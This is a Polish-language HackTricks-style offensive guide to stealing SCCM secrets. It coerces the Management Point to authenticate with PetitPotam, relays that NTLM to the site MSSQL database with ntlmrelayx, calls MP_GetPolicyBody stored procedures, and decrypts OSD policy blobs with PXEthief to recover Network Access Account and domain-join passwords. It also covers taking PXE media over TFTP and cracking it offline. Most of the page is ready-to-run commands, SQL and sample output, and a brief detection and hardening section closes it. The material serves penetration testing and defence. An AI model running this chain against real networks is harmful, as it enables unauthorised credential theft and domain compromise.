# SCCM Management Point NTLM Relay to SQL – OSD Policy Secret Extraction

{{#include ../../banners/hacktricks-training.md}}

## TL;DR
Wymuszając na **System Center Configuration Manager (SCCM) Management Point (MP)** uwierzytelnienie przez SMB/RPC i **relayując** to konto maszynowe NTLM do **site database (MSSQL)**, uzyskujesz uprawnienia `smsdbrole_MP` / `smsdbrole_MPUserSvc`. Role te pozwalają wywoływać zestaw stored procedures ujawniających bloby zasad **Operating System Deployment (OSD)** (dane uwierzytelniające Network Access Account, zmienne Task-Sequence itd.). Bloby są zakodowane szesnastkowo/zaszyfrowane, ale można je zdekodować i odszyfrować za pomocą **PXEthief**, uzyskując sekrety w postaci plaintext.<sup>[[2]](#references)</sup>

Łańcuch działań na wysokim poziomie:
1. Wykryj MP i site DB ↦ nieuwierzytelniony endpoint HTTP `/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA`.
2. Uruchom `ntlmrelayx.py -t mssql://<SiteDB> -ts -socks`.
3. Wymuś uwierzytelnienie MP za pomocą **PetitPotam**, PrinterBug, DFSCoerce itd.
4. Przez proxy SOCKS połącz się za pomocą `mssqlclient.py -windows-auth` jako relayowane konto **<DOMAIN>\\<MP-host>$**.
5. Wykonaj:
* `use CM_<SiteCode>`
* `exec MP_GetMachinePolicyAssignments N'<UnknownComputerGUID>',N''`
* `exec MP_GetPolicyBody N'<PolicyID>',N'<Version>'`   (lub `MP_GetPolicyBodyAfterAuthorization`)
6. Usuń BOM `0xFFFE`, `xxd -r -p` → XML  → `python3 pxethief.py 7 <hex>`.

Sekrety takie jak `OSDJoinAccount/OSDJoinPassword`, `NetworkAccessUsername/Password` itd. można odzyskać bez ingerowania w PXE ani klientów.<sup>[[1]](#references)[[3]](#references)</sup>

---

## 1. Enumerating unauthenticated MP endpoints
Rozszerzenie ISAPI MP **GetAuth.dll** udostępnia kilka parametrów, które nie wymagają uwierzytelnienia (chyba że site działa wyłącznie w trybie PKI):<sup>[[1]](#references)</sup>

| Parameter | Purpose |
|-----------|---------|
| `MPKEYINFORMATIONMEDIA` | Zwraca publiczny klucz certyfikatu podpisującego site oraz identyfikatory GUID urządzeń *x86* / *x64* **All Unknown Computers**. |
| `MPLIST` | Wyświetla listę wszystkich Management-Pointów w site. |
| `SITESIGNCERT` | Zwraca certyfikat podpisujący Primary-Site (umożliwia identyfikację site servera bez LDAP). |

Pobierz identyfikatory GUID, które będą działać jako **clientID** dla późniejszych zapytań do DB:
```bash
curl http://MP01.contoso.local/SMS_MP/.sms_aut?MPKEYINFORMATIONMEDIA | xmllint --format -
```
---

## 2. Przeprowadź Relay konta maszyny MP do MSSQL
```bash
# 1. Start the relay listener (SMB→TDS)
ntlmrelayx.py -ts -t mssql://10.10.10.15 -socks -smb2support

# 2. Trigger authentication from the MP (PetitPotam example)
python3 PetitPotam.py 10.10.10.20 10.10.10.99 \
-u alice -p P@ssw0rd! -d CONTOSO -dc-ip 10.10.10.10
```
Po zadziałaniu wymuszenia powinieneś zobaczyć coś takiego:
```
[*] Authenticating against mssql://10.10.10.15 as CONTOSO/MP01$ SUCCEED
[*] SOCKS: Adding CONTOSO/MP01$@10.10.10.15(1433)
```
---

## 3. Identyfikacja zasad OSD za pomocą procedur składowanych
Połącz się przez proxy SOCKS (domyślnie port 1080):<sup>[[1]](#references)</sup>
```bash
proxychains mssqlclient.py CONTOSO/MP01$@10.10.10.15 -windows-auth
```
Przełącz się do bazy danych **CM_<SiteCode>** (użyj 3-cyfrowego kodu lokacji, np. `CM_001`).

### 3.1  Znajdowanie identyfikatorów GUID nieznanych komputerów (opcjonalnie)
```sql
USE CM_001;
SELECT SMS_Unique_Identifier0
FROM dbo.UnknownSystem_DISC
WHERE DiscArchKey = 2; -- 2 = x64, 0 = x86
```
### 3.2  Lista przypisanych zasad
```sql
EXEC MP_GetMachinePolicyAssignments N'e9cd8c06-cc50-4b05-a4b2-9c9b5a51bbe7', N'';
```
Każdy wiersz zawiera `PolicyAssignmentID`, `Body` (hex), `PolicyID`, `PolicyVersion`.

Skup się na policies:
* **NAAConfig** – dane uwierzytelniające Network Access Account
* **TS_Sequence** – zmienne Task Sequence (OSDJoinAccount/Password)
* **CollectionSettings** – może zawierać konta run-as

### 3.3  Pobierz pełną zawartość
Jeśli masz już `PolicyID` i `PolicyVersion`, możesz pominąć wymaganie `clientID`, używając:
```sql
EXEC MP_GetPolicyBody N'{083afd7a-b0be-4756-a4ce-c31825050325}', N'2.00';
```
> WAŻNE: W SSMS zwiększ wartość „Maximum Characters Retrieved” (>65535), w przeciwnym razie blob zostanie obcięty.

---

## 4. Dekodowanie i deszyfrowanie blobu
```bash
# Remove the UTF-16 BOM, convert from hex → XML
echo 'fffe3c003f0078…' | xxd -r -p > policy.xml

# Decrypt with PXEthief (7 = decrypt attribute value)
python3 pxethief.py 7 $(xmlstarlet sel -t -v "//value/text()" policy.xml)
```
Przykład odzyskanych sekretów:
```
OSDJoinAccount : CONTOSO\\joiner
OSDJoinPassword: SuperSecret2025!
NetworkAccessUsername: CONTOSO\\SCCM_NAA
NetworkAccessPassword: P4ssw0rd123
```
---

## 5. Istotne role i procedury SQL
Po relay login jest mapowany na:<sup>[[1]](#references)</sup>
* `smsdbrole_MP`
* `smsdbrole_MPUserSvc`

Te role udostępniają dziesiątki uprawnień EXEC; kluczowe z nich wykorzystywane w tym ataku to:

| Stored Procedure | Cel |
|------------------|---------|
| `MP_GetMachinePolicyAssignments` | Lista policies zastosowanych do `clientID`. |
| `MP_GetPolicyBody` / `MP_GetPolicyBodyAfterAuthorization` | Zwraca kompletną policy body. |
| `MP_GetListOfMPsInSiteOSD` | Zwracana przez ścieżkę `MPKEYINFORMATIONMEDIA`. |

Pełną listę można wyświetlić za pomocą:
```sql
SELECT pr.name
FROM   sys.database_principals AS dp
JOIN   sys.database_permissions AS pe ON pe.grantee_principal_id = dp.principal_id
JOIN   sys.objects AS pr ON pr.object_id = pe.major_id
WHERE  dp.name IN ('smsdbrole_MP','smsdbrole_MPUserSvc')
AND  pe.permission_name='EXECUTE';
```
---

## 6. Pozyskiwanie nośników rozruchowych PXE (SharpPXE)
* **Odpowiedź PXE przez UDP/4011**: wyślij żądanie rozruchu PXE do Distribution Point skonfigurowanego dla PXE. Odpowiedź proxyDHCP ujawnia ścieżki rozruchowe, takie jak `SMSBoot\\x64\\pxe\\variables.dat` (zaszyfrowana konfiguracja) i `SMSBoot\\x64\\pxe\\boot.bcd`, a także opcjonalny zaszyfrowany blob klucza.<sup>[[4]](#references)</sup>
* **Pobierz artefakty rozruchowe przez TFTP**: użyj zwróconych ścieżek, aby pobrać `variables.dat` przez TFTP (bez uwierzytelniania). Plik jest mały (kilka KB) i zawiera zaszyfrowane zmienne nośnika.
* **Odszyfruj lub złam**:
- Jeśli odpowiedź zawiera klucz deszyfrujący, przekaż go do **SharpPXE**, aby bezpośrednio odszyfrować `variables.dat`.
- Jeśli klucz nie jest dostarczony (nośnik PXE jest chroniony niestandardowym hasłem), SharpPXE generuje hash zgodny z **Hashcat** w formacie `$sccm$aes128$...` do crackingu offline. Po odzyskaniu hasła odszyfruj plik.
* **Przeanalizuj odszyfrowany XML**: zmienne w postaci jawnego tekstu zawierają metadane wdrożenia SCCM (**URL Management Point**, **Site Code**, identyfikatory GUID nośników i inne identyfikatory). SharpPXE analizuje je i wyświetla gotową do uruchomienia komendę **SharpSCCM** z uzupełnionymi parametrami GUID/PFX/site, umożliwiającą dalsze nadużycia.
* **Wymagania**: wyłącznie dostęp sieciowy do listenera PXE (UDP/4011) i TFTP; uprawnienia lokalnego administratora nie są wymagane.

---

## 7. Wykrywanie i hardening
1. **Monitoruj logowania do MP** – każde logowanie konta komputera MP z adresu IP, który nie jest adresem jego hosta, ≈ relay.<sup>[[1]](#references)</sup>
2. Włącz **Extended Protection for Authentication (EPA)** w bazie danych site (`PREVENT-14`).
3. Wyłącz nieużywany NTLM, wymuś podpisywanie SMB i ogranicz RPC (te same mitigacje stosowane przeciwko `PetitPotam`/`PrinterBug`).
4. Zabezpiecz komunikację MP ↔ DB za pomocą IPSec / mutual-TLS.
5. **Ogranicz ekspozycję PXE** – filtruj na firewallu UDP/4011 i TFTP do zaufanych VLAN-ów, wymagaj haseł PXE oraz generuj alerty przy pobieraniu przez TFTP plików `SMSBoot\\*\\pxe\\variables.dat`.<sup>[[4]](#references)</sup>

---

## Zobacz także
* NTLM relay fundamentals:

{{#ref}}
../ntlm/README.md
{{#endref}}

* MSSQL abuse & post-exploitation:

{{#ref}}
abusing-ad-mssql.md
{{#endref}}

## Referencje
- [1] [Chciałbym porozmawiać z twoim Managerem: Kradzież sekretów za pomocą Management Point Relays](https://specterops.io/blog/2025/07/15/id-like-to-speak-to-your-manager-stealing-secrets-with-management-point-relays/)
- [2] [PXEthief](https://github.com/MWR-CyberSec/PXEThief)
- [3] [Misconfiguration Manager – ELEVATE-4 & ELEVATE-5](https://github.com/subat0mik/Misconfiguration-Manager)
- [4] [SharpPXE](https://github.com/leftp/SharpPXE)

{{#include ../../banners/hacktricks-training.md}}
